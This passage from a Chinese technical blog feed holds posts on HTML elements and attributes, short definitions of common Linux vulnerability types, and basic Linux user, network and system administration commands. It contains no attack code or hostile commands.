id="2-HTML元素"><a href="#2-HTML元素" class="headerlink" title="2.HTML元素"></a>2.HTML元素</h4><p>&emsp;&emsp;在HTML中，从开始标签起始，到结束标签终止，两者之间的内容为元素。大多数的HTML元素是可以嵌套的（HTML元素可以包含其他HTML元素），HTML文档就是有互相嵌套的HTML元素构成</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>撩月<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;没有内容的HTML元素被称为空元素，空元素是在开始标签中关闭。譬如：<strong>《br》</strong>（打&lt;&gt;会换行，这里用书名号代替）就是没有关闭标签的空元素，定义换行。</p><p>&emsp;&emsp;值得注意的是，HTML 标签对大小写不敏感：<P> 等同于 <p>。许多网站都使用大写的 HTML 标签。但是万维网联盟（W3C）在 <strong>HTML 4 中推荐</strong>使用小写，所以在未来 (X)HTML 版本中可能强制使用小写</p><p>&emsp;</p><h4 id="3-HTML属性"><a href="#3-HTML属性" class="headerlink" title="3.HTML属性"></a>3.HTML属性</h4><p>&emsp;&emsp;首先明确属性是在HTML元素中添加附加信息，一般描述于开始标签并总是以名称/值对的形式出现。比如：<strong>name=”liaoyue”</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--HTML 链接由 &lt;a&gt; 标签定义。链接的地址在 href 属性中指定：--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.runoob.com&quot;</span>&gt;</span>这是一个链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <br><br><br><span class="hljs-comment">&lt;!--属性值应该始终被包括在引号内,双引号是最常用的，不过使用单引号也没有问题;在某些个别的情况下，比如属性值本身就含有双引号，那么您必须使用单引号，例如：--&gt;</span><br>name=&#x27;John &quot;ShotGun&quot; Nelson&#x27; <br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="4-HTML的ID属性"><a href="#4-HTML的ID属性" class="headerlink" title="4.HTML的ID属性"></a>4.HTML的ID属性</h4><p>&emsp;&emsp;HTML的ID属性是为了HTML元素拥有指定唯一的ID，一个HTML文档中不能存在多个相同id元素。ID属性用于指向样式表中的特定样式声明，JavaScript也可以使用它来访问和操作拥有特定ID元素。</p><p>&emsp;&emsp;id的语法是写一个井号（#）后跟一个id名称，然后花括号{}中定义相关的css属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-id">#liaoyue</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">background-color</span>: lightblue;</span><br><span class="language-css">  <span class="hljs-attribute">color</span>: black;</span><br><span class="language-css">  <span class="hljs-attribute">padding</span>: <span class="hljs-number">40px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">text-align</span>: center;</span><br><span class="language-css">&#125;</span><br><span class="language-css">     </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>     <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;liaoyue&quot;</span>&gt;</span>My Header<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br><br><span class="hljs-comment">&lt;!--通过 ID 和链接实现 HTML 书签--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#C4&quot;</span>&gt;</span>跳转到第四章<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;C4&quot;</span>&gt;</span>第四章<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;在JavaScript也可以使用id属性为特定元素执行某些任务，比如使用<code>getElementById()</code> 方法访问拥有特定 id 的元素：</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%BA%8C/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="5-HTML的script标签"><a href="#5-HTML的script标签" class="headerlink" title="5.HTML的script标签"></a>5.HTML的script标签</h4><p>&emsp;&emsp;HTML——script标签用于定义客户端脚本（JavaScript），script元素元素即可包含脚本语句，也可通过src属性指向外部脚本文件。一般来说，JavaScript的常见用途是图像处理、表单验证和内容的动态更改。</p><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%BA%8C/3.png" style="zoom:80%;" /></center><p>&emsp;&emsp;需选取 HTML 元素，JavaScript 最常用 <code>document.getElementById()</code> 方法。</p><p>&emsp;</p><h4 id="6-HTML全局属性"><a href="#6-HTML全局属性" class="headerlink" title="6.HTML全局属性"></a>6.HTML全局属性</h4><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%BA%8C/4.png" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>DOM-sabotage-attacks</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux——常见漏洞类型了解</title>
    <link href="/2023/01/08/Linux%E2%80%94%E2%80%94%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E4%BA%86%E8%A7%A3/"/>
    <url>/2023/01/08/Linux%E2%80%94%E2%80%94%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E4%BA%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux——常见漏洞类型了解"><a href="#Linux——常见漏洞类型了解" class="headerlink" title="Linux——常见漏洞类型了解"></a>Linux——常见漏洞类型了解</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;Linux 作为开源操作系统，因其高度的可定制性和灵活性被广泛应用于各种场景。与此同时，由于 Linux 开放的特性，也带来了一些漏洞的风险。正如下文所述，Linux 中存在各种类型的漏洞，如提权漏洞、缓冲区溢出漏洞、拒绝服务漏洞等。这些漏洞可能会被黑客用来入侵系统、窃取用户信息、破坏系统运行等。</p><p>&emsp;&emsp;尽管如此，Linux地方咯偶氮并不是一种不可避免的问题，通过不断及时的更新软件版本，加强系统配置等安全措施，可以极大的减少系统漏洞的风险。而且Linux 的开源特性也意味着任何人都可以参与开发、维护和改进系统。这意味着有更多的人可以参与到漏洞的发现和修复中，从而更好地保障系统的安全。</p><p>&emsp;&emsp;接下来首先我会了解Linux的相关漏洞，使用docker搭建相关的环境，尝试对应的渗透测试</p><p>&emsp;</p><h4 id="1-内核漏洞"><a href="#1-内核漏洞" class="headerlink" title="1.内核漏洞"></a>1.内核漏洞</h4><p>&emsp;&emsp;Linux 内核是操作系统的核心组件，因此任何内核漏洞都可能对系统造成严重的影响，例如提升特权、拒绝服务等</p><p>&emsp;</p><h4 id="2-应用程序漏洞"><a href="#2-应用程序漏洞" class="headerlink" title="2.应用程序漏洞"></a>2.应用程序漏洞</h4><p>&emsp;&emsp;许多常用的 Linux 应用程序，例如 Apache、Nginx、MySQL 等，都有可能存在漏洞，攻击者可以利用这些漏洞来执行任意代码、窃取敏感信息等</p><p>&emsp;</p><h4 id="3-远程代码执行漏洞"><a href="#3-远程代码执行漏洞" class="headerlink" title="3.远程代码执行漏洞"></a>3.远程代码执行漏洞</h4><p>&emsp;&emsp;远程代码执行漏洞是指攻击者可以通过远程发送特制的代码或请求来执行任意代码的漏洞。这种漏洞可能存在于各种应用程序中，例如 Web 应用程序、邮件服务器等</p><p>&emsp;</p><h4 id="4-缓冲区溢出漏洞"><a href="#4-缓冲区溢出漏洞" class="headerlink" title="4.缓冲区溢出漏洞"></a>4.缓冲区溢出漏洞</h4><p>&emsp;&emsp;缓冲区溢出漏洞是指攻击者利用程序中缓冲区的边界条件不严格，向缓冲区中输入超过其容量的数据，从而导致程序崩溃或执行任意代码的漏洞</p><p>&emsp;</p><h4 id="5-认证和授权漏洞"><a href="#5-认证和授权漏洞" class="headerlink" title="5.认证和授权漏洞"></a>5.认证和授权漏洞</h4><p>&emsp;&emsp;认证和授权漏洞是指攻击者可以利用弱密码、会话劫持等方式绕过身份验证和授权机制，获取系统的敏感信息或执行操作</p><p>&emsp;</p><h4 id="6-特权提升漏洞"><a href="#6-特权提升漏洞" class="headerlink" title="6.特权提升漏洞"></a>6.特权提升漏洞</h4><p>&emsp;&emsp;特权提升漏洞是指攻击者可以利用操作系统或应用程序中的漏洞提升自己的权限，获取系统管理员权限或者 root 权限，这里需要提一下，Linux和window的漏洞区别中， Linux 系统中更常见的是权限提升漏洞，而 Windows 系统中则更常见的是远程代码执行漏洞</p><p>&emsp;</p><h4 id="7-SQL-注入漏洞"><a href="#7-SQL-注入漏洞" class="headerlink" title="7.SQL 注入漏洞"></a>7.SQL 注入漏洞</h4><p>&emsp;&emsp;SQL 注入漏洞是指攻击者利用应用程序中未正确过滤用户输入的 SQL 语句，从而获取数据库中的敏感信息或执行任意操作</p><p>&emsp;</p><h4 id="8-跨站脚本漏洞"><a href="#8-跨站脚本漏洞" class="headerlink" title="8.跨站脚本漏洞"></a>8.跨站脚本漏洞</h4><p>&emsp;&emsp;跨站脚本漏洞（XSS）是指攻击者可以利用 Web 应用程序中未正确过滤用户输入的数据，在其他用户的浏览器中执行恶意代码，从而窃取用户的敏感信息或执行其他操作</p><p>&emsp;</p><h4 id="9-CSRF-攻击"><a href="#9-CSRF-攻击" class="headerlink" title="9.CSRF 攻击"></a>9.CSRF 攻击</h4><p>&emsp;&emsp;CSRF（Cross-Site Request Forgery）攻击是一种利用用户身份的攻击方式。攻击者通过伪造请求，诱使用户在不知情的情况下执行一些操作，例如修改密码、转账等</p><p>&emsp;</p><h4 id="10-命令注入漏洞"><a href="#10-命令注入漏洞" class="headerlink" title="10.命令注入漏洞"></a>10.命令注入漏洞</h4><p>&emsp;&emsp;命令注入漏洞是指攻击者可以通过向应用程序中输入恶意代码，从而在系统上执行任意操作。这种漏洞常常存在于需要用户输入命令的应用程序中，例如 shell 脚本、邮件客户端等</p><p>&emsp;</p><h4 id="11-XML-外部实体注入漏洞"><a href="#11-XML-外部实体注入漏洞" class="headerlink" title="11.XML 外部实体注入漏洞"></a>11.XML 外部实体注入漏洞</h4><p>&emsp;&emsp;XML 外部实体注入漏洞是指攻击者可以利用 XML 处理器中的漏洞，向 XML 文档中插入外部实体，从而执行任意代码或访问敏感信息</p><p>&emsp;</p><h4 id="12-拒绝服务攻击"><a href="#12-拒绝服务攻击" class="headerlink" title="12.拒绝服务攻击"></a>12.拒绝服务攻击</h4><p>&emsp;&emsp;拒绝服务攻击是指攻击者通过向系统发送大量无效请求或恶意代码，使系统过载或崩溃的攻击方式。这种攻击可以导致系统无法正常工作，甚至瘫痪</p><p>&emsp;</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux——三种管理层面</title>
    <link href="/2023/01/05/Linux%E2%80%94%E2%80%94%E4%B8%89%E7%A7%8D%E7%AE%A1%E7%90%86%E5%B1%82%E9%9D%A2/"/>
    <url>/2023/01/05/Linux%E2%80%94%E2%80%94%E4%B8%89%E7%A7%8D%E7%AE%A1%E7%90%86%E5%B1%82%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux——三种管理层面"><a href="#Linux——三种管理层面" class="headerlink" title="Linux——三种管理层面"></a>Linux——三种管理层面</h1><h4 id="1-用户管理"><a href="#1-用户管理" class="headerlink" title="1.用户管理"></a>1.用户管理</h4><ul><li><h5 id="用户组-用户"><a href="#用户组-用户" class="headerlink" title="用户组/用户"></a>用户组/用户</h5><p>&emsp;&emsp;Linux 是一个多用户、多任务操作系统，支持许多用户在同一时间登录，并共享计算机的资源。为了管理这些用户，Linux 使用了用户和用户组的概念。</p><p>&emsp;&emsp;用户（user）是系统中拥有登录权限的个人账户，每个用户都有一个唯一的用户名（username）和一个唯一的用户 ID（uid）。用户可以拥有自己的文件和目录，并且可以访问系统的共享资源。</p><p>&emsp;&emsp;用户组（group）是一组用户的集合，每个用户可以属于一个或多个用户组。用户组有一个唯一的名称（groupname）和一个唯一的用户组 ID（gid）。用户组可以用于控制文件和目录的权限，使一组用户可以共享文件和目录的访问权限</p></li><li><h5 id="用户管理相关文件"><a href="#用户管理相关文件" class="headerlink" title="用户管理相关文件"></a>用户管理相关文件</h5><p>&emsp;&emsp;在 Linux 中，每个用户都有自己的 HOME 目录，用于存储用户的个人文件和配置信息。用户可以在自己的 HOME 目录下创建文件和目录，并根据需要设置文件和目录的权限，以控制其他用户对它们的访问权限。</p><p>&emsp;&emsp;Linux 中的文件权限包括读（read）、写（write）和执行（execute）权限，这些权限可以分别赋予文件的所有者、所属用户组和其他用户。以下是 Linux 中用于管理文件和目录权限的命令：</p><ol><li>chmod：用于修改文件和目录的权限，可以使用数字或符号表示权限；</li><li>chown：用于修改文件或目录的所有者；</li><li>chgrp：用于修改文件或目录的所属用户组。</li></ol></li><li><h5 id="用户管理基本命令"><a href="#用户管理基本命令" class="headerlink" title="用户管理基本命令"></a>用户管理基本命令</h5><ol><li><p>useradd：添加用户账户</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">useradd <span class="hljs-selector-attr">[options]</span> username<br></code></pre></td></tr></table></figure></li><li><p>passwd：设置用户密码</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">passwd username</span><br></code></pre></td></tr></table></figure></li><li><p>userdel：删除用户账户</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">userdel <span class="hljs-selector-attr">[options]</span> username<br></code></pre></td></tr></table></figure></li><li><p>usermod：修改用户账户</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">usermod <span class="hljs-selector-attr">[options]</span> username<br></code></pre></td></tr></table></figure></li><li><p>groupadd：添加用户组</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">groupadd groupname</span><br></code></pre></td></tr></table></figure></li><li><p>groupdel：删除用户组</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">groupdel groupname</span><br></code></pre></td></tr></table></figure></li><li><p>id：查看用户账户信息</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">id</span> username<br></code></pre></td></tr></table></figure></li></ol></li><li><h5 id="文件和目录归属"><a href="#文件和目录归属" class="headerlink" title="文件和目录归属"></a>文件和目录归属</h5><p>&emsp;&emsp;在 Linux 中，每个文件和目录都有一个所属用户和所属用户组。这些信息决定了谁有权访问文件和目录，并且可以用来限制其他用户的访问权限</p><p>&emsp;&emsp;每个用户都有一个唯一的用户标识符（UID）和一个所属用户组标识符（GID）。当创建一个新文件或目录时，它的所有者默认为创建它的用户，所属用户组默认为该用户的默认用户组。可以使用以下命令查看当前用户的 UID 和 GID</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls -l filename<br><span class="hljs-regexp">//</span>可以使用还命令查看文件的或目录的归属<br></code></pre></td></tr></table></figure></li><li><h5 id="文件和目录权限"><a href="#文件和目录权限" class="headerlink" title="文件和目录权限"></a>文件和目录权限</h5><p>&emsp;&emsp;在 Linux 中，文件和目录的访问权限是通过一组三位数字来表示的，分别代表所有者、所属用户组和其他用户的权限。每个数字表示三个二进制位，分别代表读（r）、写（w）和执行（x）权限，没有权限用 0 表示，有权限用 1 表示。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls -l filename<br><span class="hljs-regexp">//</span>可以使用该命令查看文件或目录的权限<br></code></pre></td></tr></table></figure></li></ul><p>&emsp;</p><h4 id="2-网络管理"><a href="#2-网络管理" class="headerlink" title="2.网络管理"></a>2.网络管理</h4><ul><li><h5 id="网络配置文件"><a href="#网络配置文件" class="headerlink" title="网络配置文件"></a>网络配置文件</h5><p>&emsp;&emsp;在 Linux 中，网络配置文件通常位于 /etc 目录下，主要包括以下文件:</p><ol><li>/etc/hosts：该文件用于将 IP 地址映射到主机名，可以手动添加条目以自定义主机名和 IP 地址的映射。</li><li>/etc/hostname：该文件包含主机名，可以使用编辑器修改主机名。</li><li>/etc/network/interfaces：该文件包含了所有网络接口的配置信息，包括 IP 地址、子网掩码、网关等。</li><li>/etc/resolv.conf：该文件包含了 DNS 服务器的配置信息，可以手动添加 DNS 服务器的 IP 地址。</li><li>/etc/nsswitch.conf：该文件指定系统如何查找各种网络服务的信息，例如主机名、用户信息等。</li><li>/etc/sysconfig/network-scripts/ifcfg-<interface>：该文件包含指定接口的配置信息，如 IP 地址、子网掩码、网关、DNS 等。在不同的 Linux 发行版中，此文件可能位于不同的目录中</li></ol></li><li><h5 id="查看及配置网络"><a href="#查看及配置网络" class="headerlink" title="查看及配置网络"></a>查看及配置网络</h5><ol><li><p>ifconfig</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ifconfig eth0<br><span class="hljs-regexp">//</span>用于显示和配置网络接口的信息，例如 IP 地址、子网掩码、MAC 地址等<br></code></pre></td></tr></table></figure></li><li><p>ip</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">ip</span> addr <span class="hljs-keyword">add</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">24</span> dev eth0<br>//是 ifconfig 的替代工具，提供更多的网络配置选项。例如，使用 <span class="hljs-built_in">ip</span> 命令设置 eth0 网络接口的 <span class="hljs-built_in">IP</span> 地址为 <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure></li><li><p>ping</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-regexp">//</span>用于测试主机之间的网络连通性，可以通过向目标主机发送 ICMP 数据包来检测网络是否正常<br></code></pre></td></tr></table></figure></li><li><p>route</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">route <span class="hljs-keyword">add</span> <span class="hljs-literal">default</span> gw <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><span class="hljs-comment">//用于显示和配置网络路由表，可以添加、删除和修改路由规则</span><br></code></pre></td></tr></table></figure></li><li><p>nmcli</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">nmcli connection show<br><span class="hljs-regexp">//</span>是 Network Manager 的命令行界面工具，可以用于配置网络连接、查看网络状态等<br></code></pre></td></tr></table></figure></li><li><p>nmtui</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">nmtui<br><span class="hljs-regexp">//</span>是 Network Manager 的文本界面工具，可以通过交互式菜单来配置网络连接<br></code></pre></td></tr></table></figure></li></ol></li><li><h5 id="域名相关"><a href="#域名相关" class="headerlink" title="域名相关"></a>域名相关</h5><p>&emsp;&emsp;在 Linux 中，可以使用一些命令来进行域名解析和管理</p><ol><li><p>dig</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">dig example.com<br><span class="hljs-regexp">//</span>用于查询 DNS 服务器的信息，例如域名解析结果、DNS 记录等<br></code></pre></td></tr></table></figure></li><li><p>nslookup</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">nslookup example.com<br><span class="hljs-regexp">//</span>也是用于查询 DNS 服务器的信息，可以查询域名解析结果、DNS 记录等<br></code></pre></td></tr></table></figure></li><li><p>hostname</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">hostname<br><span class="hljs-regexp">//</span>用于显示或设置主机名。例如，使用 hostname 命令显示当前主机名<br></code></pre></td></tr></table></figure></li><li><p>hostnamectl</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> <span class="hljs-string">myhostname</span><br>//用于管理主机名，可以设置静态主机名、临时主机名等<br></code></pre></td></tr></table></figure></li></ol></li><li><h5 id="下载传输"><a href="#下载传输" class="headerlink" title="下载传输"></a>下载传输</h5><p>&emsp;&emsp;在 Linux 中，有多种下载和传输文件的方式，以下是其中几种常用的方式</p><ol><li><p>wget</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>example.com/file.zip<br><span class="hljs-regexp">//g</span>et 是一个基于命令行的下载工具，可以下载 HTTP、HTTPS、FTP 等协议的文件<br></code></pre></td></tr></table></figure></li><li><p>curl</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -O http:<span class="hljs-regexp">//</span>example.com/file.zip<br><span class="hljs-regexp">//</span>curl 也是一个基于命令行的下载工具，支持多种协议和数据传输方式<br></code></pre></td></tr></table></figure></li><li><p>scp</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">scp file.txt user<span class="hljs-variable">@remotehost</span><span class="hljs-symbol">:/path/to/destination</span><br>//scp 是一个基于 <span class="hljs-title class_">SSH</span> 协议的文件传输工具，可以在 <span class="hljs-title class_">Linux</span> 主机之间传输文件<br></code></pre></td></tr></table></figure></li><li><p>rsync</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">rsync -avz --progress <span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/local/</span>dir user@remotehost:<span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/remote/</span>dir<br><span class="hljs-regexp">//</span>rsync 也是一个基于 SSH 协议的文件传输工具，支持增量同步和快速复制文件<br></code></pre></td></tr></table></figure></li><li><p>ftp</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">ftp</span> <span class="hljs-keyword">ftp</span>.example.com<br><span class="hljs-built_in">get</span> <span class="hljs-built_in">file</span>.txt<span class="hljs-comment"></span><br><span class="hljs-comment">//ftp 是一种基于文件传输协议的文件传输工具，可以在 Linux 主机之间传输文件</span><br></code></pre></td></tr></table></figure></li></ol></li></ul><p>&emsp;</p><h4 id="3-系统状态管理"><a href="#3-系统状态管理" class="headerlink" title="3.系统状态管理"></a>3.系统状态管理</h4><ul><li><h5 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h5><ol><li><p>uname</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">uname -r<br><span class="hljs-regexp">//</span>该命令可以查看系统内核的版本、系统架构等信息。例如，使用 uname 命令查看系统内核版本<br></code></pre></td></tr></table></figure></li><li><p>sb_release</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">lsb_release -a<br><span class="hljs-regexp">//</span>该命令可以查看 Linux 发行版的信息。例如，使用 lsb_release 命令查看 Linux 发行版的版本....<br></code></pre></td></tr></table></figure></li></ol></li><li><h5 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h5><ol><li><p>top </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">top<br><span class="hljs-regexp">//</span>该命令可以查看系统的进程和资源占用情况。例如，使用 top 命令查看系统的进程和资源占用情况<br></code></pre></td></tr></table></figure></li></ol></li><li><h5 id="内存使用情况"><a href="#内存使用情况" class="headerlink" title="内存使用情况"></a>内存使用情况</h5><ol><li><p>free</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">free -h<br><span class="hljs-regexp">//</span>该命令可以查看系统的内存使用情况。例如，使用 free 命令查看系统的内存使用情况<br></code></pre></td></tr></table></figure></li></ol></li><li><h5 id="磁盘使用情况"><a href="#磁盘使用情况" class="headerlink" title="磁盘使用情况"></a>磁盘使用情况</h5><ol><li><p>df</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">df -h<br><span class="hljs-regexp">//</span>该命令可以查看文件系统的磁盘使用情况。例如，使用 df 命令查看磁盘使用情况<br></code></pre></td></tr></table></figure></li><li><p>du</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">du -h<br><span class="hljs-regexp">//</span>该命令可以查看指定目录或文件的磁盘使用情况。例如，使用 du 命令查看当前目录的磁盘使用情况<br></code></pre></td></tr></table></figure></li></ol></li></ul><h5 id="emsp"><a href="#emsp" class="headerlink" title="&emsp;"></a>&emsp;</h5>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Liunx——文件命令操作</title>
    <link href="/2023/01/03/Liunx%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/"/>
    <url>/2023/01/03/Liunx%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/</url>
    
